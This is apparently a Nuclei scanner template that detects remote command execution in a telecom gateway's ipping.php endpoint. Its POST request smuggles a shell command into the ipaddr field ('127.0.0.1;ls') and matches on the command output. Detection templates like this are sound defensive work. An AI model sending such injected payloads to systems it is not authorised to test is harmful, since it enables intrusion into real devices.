id: telecom-gateway-ipping-php-rce
info:
  name: Telecom Gateway Configuration Management System ipping.php Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - raw:
      - |
        POST /manager/ipping.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        ipaddr=127.0.0.1;ls
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "64 bytes from 127.0.0.1"
          - "config"
          - ".php"
        part: body
